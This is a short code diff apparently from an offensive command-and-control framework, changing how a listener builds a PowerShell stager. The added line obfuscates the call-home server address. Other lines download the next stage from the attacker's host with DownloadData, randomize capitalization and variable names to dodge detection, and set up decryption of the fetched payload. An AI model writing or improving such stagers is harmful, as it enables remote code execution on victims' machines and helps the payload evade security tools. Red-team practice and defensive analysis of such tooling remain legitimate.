@@ -207,7 +207,8 @@ class Listener(object):
 
                 #stager += "$ser=%s;$t='%s';" % (helpers.obfuscate_call_home_address(host), stage0)
                 #stager += "$ser=" + helpers.obfuscate_call_home_address(host) + ";$t='" + stage0 + "';"
-                stager += "$ser='%s';$t='%s';$hop='%s';" % (host, stage0, listenerName)
+                #stager += "$ser='%s';$t='%s';$hop='%s';" % (host, stage0, listenerName)
+                stager += "$ser='%s';$t='%s';$hop='%s';" % (helpers.obfuscate_call_home_address(host), stage0, listenerName)
 
                 stager += helpers.randomize_capitalization("$data=$"+helpers.generate_random_script_var_name("wc")+".DownloadData($ser+$t);")
                 stager += helpers.randomize_capitalization("$iv=$data[0..3];$data=$data[4..$data.length];")
